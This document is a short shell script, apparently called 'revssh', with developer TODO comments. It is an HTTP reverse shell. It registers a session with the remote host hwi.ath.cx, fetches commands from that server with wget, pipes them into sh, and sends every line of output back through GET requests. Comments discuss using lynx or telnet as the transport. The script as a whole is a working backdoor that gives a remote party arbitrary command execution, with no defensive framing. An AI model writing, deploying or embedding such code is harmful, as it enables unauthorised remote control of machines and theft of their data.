## TODO: Output should be clumped together, not one request per line
##       Could we use HTML upload instead of post/get?
SERVER="hwi.ath.cx"
URL="/cgi-bin/joey/revssh"

SESSID=`hostname`"_$$"

COM="wget -O -"
## Note the next probably should be lynx -source (since -dump un-HTMLs)
# COM="lynx -dump"
## Actually we can't put the telnet in $COM because it'd need to be more
## like: mywget() { echo "GET $URLPATH" | telnet "$URLHOST" }
# COM="telnet ..."

$COM "http://$SERVER$URL?sessid=$SESSID&init=true" |

sh 2>&1 |

while read LINE; do
	$COM "http://$SERVER$URL?sessid=$SESSID&output=$LINE"
done
